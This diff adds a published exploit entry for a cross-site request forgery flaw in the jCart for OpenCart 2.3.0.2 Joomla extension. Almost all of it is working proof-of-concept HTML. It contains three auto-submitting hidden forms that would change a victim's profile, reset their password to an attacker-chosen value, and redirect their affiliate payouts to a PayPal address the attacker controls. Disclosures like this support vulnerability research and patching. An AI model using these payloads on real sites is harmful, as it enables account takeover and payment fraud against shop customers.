@@ -1,0 +1,61 @@
+# Exploit Title: Joomla! extension jCart for OpenCart 2.3.0.2 - Cross site request forgery
+# Date: 2018-05-28
+# Exploit Author: L0RD or borna.nematzadeh123@gmail.com
+# Software Link: https://extensions.joomla.org/extensions/extension/e-commerce/e-commerce-integrations/jcart-for-opencart/
+# Vendor Homepage: https://www.joomlaextensions.co.in/
+# Version: 2.3.0.2
+# Tested on: Kali linux
+===================================================
+
+# POC :
+
+# Change user information exploit :
+
+<html>
+  <body>
+    <form action="http://site.com/jcart/account/edit.html" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="firstname" value="D3C0DE" />
+      <input type="hidden" name="lastname" value="revenge" />
+      <input type="hidden" name="email" value="decod3&#46;n&#64;gmail&#46;com" />
+      <input type="hidden" name="telephone" value="100000" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
+# Change password exploit :
+
+<form action="http://site.com/jcart/account/password.html" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="password" value="2468" />
+      <input type="hidden" name="confirm" value="2468" />
+</form>
+<script>
+   document.forms[0].submit();
+</script>
+
+
+# Change affiliate account information exploit :
+
+ <form action="http://site.com/jcart/account/affiliate/edit.html" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="company" value="decode" />
+      <input type="hidden" name="website" value="test&#46;com" />
+      <input type="hidden" name="tax" value="100000000" />
+      <input type="hidden" name="payment" value="paypal" />
+      <input type="hidden" name="cheque" value="&#13;" />
+      <input type="hidden" name="paypal" value="test&#64;test&#46;com" />
+      <input type="hidden" name="bank&#95;name" value="&#13;" />
+      <input type="hidden" name="bank&#95;branch&#95;number" value="&#13;"
+/>
+      <input type="hidden" name="bank&#95;swift&#95;code" value="&#13;" />
+      <input type="hidden" name="bank&#95;account&#95;name" value="&#13;" />
+      <input type="hidden" name="bank&#95;account&#95;number" value="&#13;"
+/>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+
+====================================================
